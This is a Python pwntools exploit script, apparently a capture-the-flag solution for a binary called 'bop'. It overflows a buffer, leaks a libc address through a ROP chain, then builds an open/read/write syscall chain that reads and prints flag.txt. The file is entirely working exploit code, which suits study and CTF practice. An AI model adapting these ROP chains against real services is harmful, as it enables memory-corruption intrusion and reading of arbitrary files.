from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./bop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}

#p = process("./bop")
p = remote("localhost", 5000)
#p = gdb.debug("./bop",'''
#break *_start
#break *0x4012f9
#break *0x401359
#break *0x401365
#''')

# Gadgets
pop_rdi = 0x4013d3
pop_rsi = 0x4013d1 # rdi;r15
ret = 0x40101a

# Functions
main = 0x4012f9
gets_plt_got = 0x404040
printf_plt = 0x4010f0

# LIBC leak payload
leak = cyclic(40)
leak += p64(pop_rdi)
leak += p64(gets_plt_got)
leak += p64(ret)
leak += p64(printf_plt)
leak += p64(ret)
leak += p64(main)

p.sendlineafter('bop?', leak)
p.recvuntil(b' ')

# LIBC leaks
libc_gets_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_read = libc_gets_leak + 566864
libc_pop_rsi = libc_gets_leak - 383313
libc_pop_rax = libc_gets_leak - 317436
libc_pop_rdx = libc_gets_leak + 783138
libc_syscall = libc_gets_leak + 586676
flag = 0x404070 # .data section RW

print("libc gets() leak: ", hex(libc_gets_leak))
print("flag address: ", hex(flag))

# read literal string "flag.txt" into RW .data section address.
# read(0, [flag.txt memory address], 0x10);
exploit = cyclic(40)
exploit += p64(pop_rdi)
exploit += p64(0x0)
exploit += p64(libc_pop_rsi)
exploit += p64(flag)
exploit += p64(libc_pop_rdx)
exploit += p64(0x11)
exploit += p64(ret)
exploit += p64(libc_read)

# open([flag.txt memory address], 4)
exploit += p64(pop_rdi)
exploit += p64(flag)
exploit += p64(libc_pop_rsi)
exploit += p64(0x40)
exploit += p64(libc_pop_rax)
exploit += p64(0x2)
exploit += p64(libc_syscall)
exploit += p64(ret)

# read(0, [flag.txt memory address], 0x10);
exploit += p64(pop_rdi)
exploit += p64(0x3)
exploit += p64(libc_pop_rsi)
exploit += p64(flag)
exploit += p64(libc_pop_rdx)
exploit += p64(0x10)
exploit += p64(libc_pop_rax)
exploit += p64(0x0)
exploit += p64(libc_syscall)

#write(1, [flag.txt memory address], 0x10)
exploit += p64(pop_rdi)
exploit += p64(0x1)
exploit += p64(libc_pop_rsi)
exploit += p64(flag)
exploit += p64(libc_pop_rdx)
exploit += p64(0x10)
exploit += p64(libc_pop_rax)
exploit += p64(0x1)
exploit += p64(libc_syscall)
exploit += p64(ret)

# After sending 2nd payload, we send 'flag.txt\0' to 1st read() syscall.
# Avoided going back to [0x4012f9](main) to minimize stack
# movement. Going back to main() worked fine until errors
# on the 2nd READ SYSCALL in printf() after OPEN SYSCALL.

pause()
p.sendlineafter(b'bop?', exploit)
p.sendline(b'flag.txt\0')    # sends to 1st READ SYSCALL
p.interactive()
